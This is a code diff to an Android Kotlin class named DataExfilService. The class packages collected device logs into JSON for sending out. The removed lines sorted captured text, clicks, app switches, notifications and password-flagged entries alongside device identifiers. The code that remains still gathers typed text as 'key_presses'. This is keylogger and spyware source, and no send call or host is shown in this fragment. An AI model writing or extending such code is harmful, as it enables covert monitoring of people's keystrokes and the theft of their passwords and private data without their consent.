@@ -262,39 +262,22 @@ class DataExfilService : Service() {
         Log.d(TAG, "Parsing ${logsArray.size} log entries")
 
         val notificationData = JSONObject().apply {
-            put("type", "watch")
-            put("device_id", getUniqueDeviceId())
-            put("device_model", Build.MODEL)
-            put("android_version", Build.VERSION.RELEASE)
             put("timestamp", System.currentTimeMillis())
             put("total_entries", logsArray.size)
             put("collection_time", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
-            put("app_package", packageName)
         }
 
         val keyPresses = JSONArray()
-        val appSwitches = JSONArray()
-        val clicks = JSONArray()
-        val sensitiveData = JSONArray()
-        val notifications = JSONArray()
 
         logsArray.forEach { line ->
             when {
                 line.contains("TYPING") || line.contains("TEXT") -> keyPresses.put(line)
-                line.contains("APP_SWITCH") -> appSwitches.put(line)
-                line.contains("CLICK") -> clicks.put(line)
-                line.contains("SENSITIVE") || line.contains("PASSWORD") -> sensitiveData.put(line)
-                line.contains("NOTIFICATION") -> notifications.put(line)
                 else -> keyPresses.put(line)
             }
         }
 
         val categorizedLogs = JSONObject().apply {
             put("key_presses", keyPresses)
-            put("app_switches", appSwitches)
-            put("clicks", clicks)
-            put("sensitive_data", sensitiveData)
-            put("notifications", notifications)
         }
 
         notificationData.put("logs", categorizedLogs)
